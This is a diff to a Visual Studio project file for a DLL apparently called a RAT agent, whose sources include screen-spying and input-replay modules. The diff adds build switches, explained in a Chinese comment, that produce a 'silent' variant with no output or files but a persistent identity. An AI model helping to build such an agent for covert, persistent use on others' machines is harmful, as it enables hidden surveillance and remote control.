@@ -48,11 +48,18 @@
     <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
   </ImportGroup>
   <PropertyGroup Label="UserMacros" />
+  <!-- 诊断/落盘开关（可命令行覆盖）：默认 1/1 = 既有行为。见 core/agent_debug.h
+       例：-p:RatAgentDebug=0                      → 静默（无输出、无文件）
+           -p:RatAgentDebug=0 -p:RatAgentPersistId=1 → 静默但保留稳定身份（只落 id） -->
+  <PropertyGroup Label="RatAgentSwitches">
+    <RatAgentDebug Condition="'$(RatAgentDebug)' == ''">1</RatAgentDebug>
+    <RatAgentPersistId Condition="'$(RatAgentPersistId)' == ''">$(RatAgentDebug)</RatAgentPersistId>
+  </PropertyGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
     <ClCompile>
       <WarningLevel>Level3</WarningLevel>
       <SDLCheck>true</SDLCheck>
-      <PreprocessorDefinitions>_USRDLL;RAT_AGENT_DLL;_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions>_USRDLL;RAT_AGENT_DLL;RAT_AGENT_DEBUG=$(RatAgentDebug);RAT_AGENT_PERSIST_ID=$(RatAgentPersistId);_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <LanguageStandard>stdcpp17</LanguageStandard>
       <AdditionalOptions>/utf-8 %(AdditionalOptions)</AdditionalOptions>
       <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
@@ -77,7 +84,7 @@
       <FunctionLevelLinking>true</FunctionLevelLinking>
       <IntrinsicFunctions>true</IntrinsicFunctions>
       <SDLCheck>true</SDLCheck>
-      <PreprocessorDefinitions>_USRDLL;RAT_AGENT_DLL;_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions>_USRDLL;RAT_AGENT_DLL;RAT_AGENT_DEBUG=$(RatAgentDebug);RAT_AGENT_PERSIST_ID=$(RatAgentPersistId);_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <LanguageStandard>stdcpp17</LanguageStandard>
       <AdditionalOptions>/utf-8 %(AdditionalOptions)</AdditionalOptions>
       <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
@@ -106,6 +113,7 @@
     <ClCompile Include="core\screen_spy.cpp" />
     <ClCompile Include="core\desktop_switch.cpp" />
     <ClCompile Include="core\input_replay.cpp" />
+    <ClInclude Include="core\agent_debug.h" />
     <ClInclude Include="core\agent_runtime.h" />
     <ClInclude Include="core\protocol.h" />
     <ClInclude Include="core\crypto.h" />
